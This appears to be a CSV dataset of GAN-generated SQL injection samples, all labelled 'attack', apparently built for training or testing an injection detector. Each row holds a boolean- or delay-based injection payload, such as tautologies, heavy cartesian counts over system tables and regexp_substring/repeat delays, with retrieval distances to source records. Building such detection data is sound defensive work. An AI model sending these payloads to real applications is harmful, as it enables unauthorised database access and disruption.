id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,4.520331179449457
CTGAN_000002,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,6.16019326421846
CTGAN_000003,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000054,8.988012082969734
CTGAN_000004,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000152,5.378158240071193
CTGAN_000005,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,5.803551855201435
CTGAN_000006,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,3.8025134145820694
CTGAN_000007,attack,boolean," end and   (  ""xksk""  =  ""xksk",nearest_attack_euclidean,R000019,7.37939383372548
CTGAN_000008,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,4.21887928147855
CTGAN_000009,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,5.213456673486895
CTGAN_000010,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,5.74307125797605
CTGAN_000011,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000039,5.990908817567484
CTGAN_000012,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,6.484752515868404
CTGAN_000013,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,5.295102810807369
CTGAN_000014,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000037,7.655503271964368
CTGAN_000015,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,5.6742201906584055
CTGAN_000016,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,5.111750862289243
CTGAN_000017,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000020,7.246194219900142
CTGAN_000018,attack,boolean," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000007,5.1576326444560685
CTGAN_000019,attack,boolean," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000007,8.092454501882825
CTGAN_000020,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,8.778013742333902
CTGAN_000021,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000103,6.055478926653748
CTGAN_000022,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,5.859842784476444
CTGAN_000023,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,5.239182642176226
CTGAN_000024,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,8.229564056512425
CTGAN_000025,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000027,5.497072216964113
CTGAN_000026,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,5.650942946989137
CTGAN_000027,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,6.096859186420358
